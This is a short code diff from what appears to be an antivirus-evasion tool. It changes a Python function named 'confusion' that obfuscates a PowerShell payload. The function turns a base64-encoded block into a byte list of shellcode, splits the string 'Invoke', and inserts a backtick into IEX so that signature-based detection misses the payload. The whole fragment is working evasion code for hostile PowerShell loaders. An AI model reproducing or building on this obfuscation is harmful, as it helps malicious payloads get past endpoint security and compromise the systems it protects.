@@ -1,5 +1,3 @@
-
-
 import random
 import sys
 import re
@@ -34,7 +32,7 @@ def confusion(payload):
     for i in base64.b64decode(VarBase64[18:-2]):
         shellcode += str(i) + ','
     shellcode = shellcode[:-1] + ')'
-    AVpayload = re.sub(VarBase64, shellcode, AVpayload)
+    AVpayload = re.sub(r"\[System.Convert\]::FromBase64String\('.+'\)", shellcode, AVpayload)
     AVpayload = re.sub(r"'Invoke'", r"'Invo'+'ke'", AVpayload)
     AVpayload = re.sub(r"IEX", r"I`eX", AVpayload)
 
